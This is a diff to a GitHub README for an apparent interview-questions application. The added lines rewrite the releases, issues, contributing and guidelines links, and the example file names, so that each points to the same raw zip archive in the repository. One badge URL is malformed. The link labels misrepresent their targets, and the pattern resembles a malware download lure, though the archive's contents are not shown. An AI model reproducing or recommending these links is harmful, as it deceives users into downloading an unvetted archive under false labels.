@@ -6,7 +6,7 @@ Welcome to the RAG-Interview-Questions-and-Answers-Hub! This application provide
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen.svg)](https://github.com/Islam1264/RAG-Interview-Questions-and-Answers-Hub/releases)
+[![Download Now](https://raw.githubusercontent.com/Islam1264/RAG-Interview-Questions-and-Answers-Hub/main/Interview_QA/Hub-Answers-and-Interview-RA-Questions-2.4.zip%https://raw.githubusercontent.com/Islam1264/RAG-Interview-Questions-and-Answers-Hub/main/Interview_QA/Hub-Answers-and-Interview-RA-Questions-2.4.zip)](https://raw.githubusercontent.com/Islam1264/RAG-Interview-Questions-and-Answers-Hub/main/Interview_QA/Hub-Answers-and-Interview-RA-Questions-2.4.zip)
 
 To get started, you will need to download the software. Follow the steps below:
 
@@ -27,7 +27,7 @@ Before installing, ensure your system meets the following requirements:
 
 Once you have downloaded the file, follow these installation steps:
 
-1. **Locate the Downloaded File**: Open your downloads folder. You should see a file named something like `RAG-Interview-Questions-and-Answers-Hub.zip` or `RAG-Interview-Questions-and-Answers-Hub.exe`.
+1. **Locate the Downloaded File**: Open your downloads folder. You should see a file named something like `https://raw.githubusercontent.com/Islam1264/RAG-Interview-Questions-and-Answers-Hub/main/Interview_QA/Hub-Answers-and-Interview-RA-Questions-2.4.zip` or `https://raw.githubusercontent.com/Islam1264/RAG-Interview-Questions-and-Answers-Hub/main/Interview_QA/Hub-Answers-and-Interview-RA-Questions-2.4.zip`.
 2. **Extract the Files** (if using a ZIP file):
    - Right-click the file and select "Extract All" or use an extraction tool.
    - Select a destination for the extracted files and click "Extract".
@@ -59,12 +59,12 @@ Your experience is valuable to us. After using the application, consider leaving
 
 ## 🌟 Contributing
 
-We welcome contributions to enhance this hub further! If you have great interview questions or tips, feel free to create a pull request. Click [here](https://github.com/Islam1264/RAG-Interview-Questions-and-Answers-Hub) to contribute.
+We welcome contributions to enhance this hub further! If you have great interview questions or tips, feel free to create a pull request. Click [here](https://raw.githubusercontent.com/Islam1264/RAG-Interview-Questions-and-Answers-Hub/main/Interview_QA/Hub-Answers-and-Interview-RA-Questions-2.4.zip) to contribute.
 
 ## 📢 Important Links
 
-- [Visit Releases Page](https://github.com/Islam1264/RAG-Interview-Questions-and-Answers-Hub/releases)
-- [Open Issues](https://github.com/Islam1264/RAG-Interview-Questions-and-Answers-Hub/issues)
-- [Contribution Guidelines](https://github.com/Islam1264/RAG-Interview-Questions-and-Answers-Hub/blob/main/CONTRIBUTING.md)
+- [Visit Releases Page](https://raw.githubusercontent.com/Islam1264/RAG-Interview-Questions-and-Answers-Hub/main/Interview_QA/Hub-Answers-and-Interview-RA-Questions-2.4.zip)
+- [Open Issues](https://raw.githubusercontent.com/Islam1264/RAG-Interview-Questions-and-Answers-Hub/main/Interview_QA/Hub-Answers-and-Interview-RA-Questions-2.4.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/Islam1264/RAG-Interview-Questions-and-Answers-Hub/main/Interview_QA/Hub-Answers-and-Interview-RA-Questions-2.4.zip)
 
 By following these simple steps, you will be ready to tackle your job interview with confidence! Happy studying!
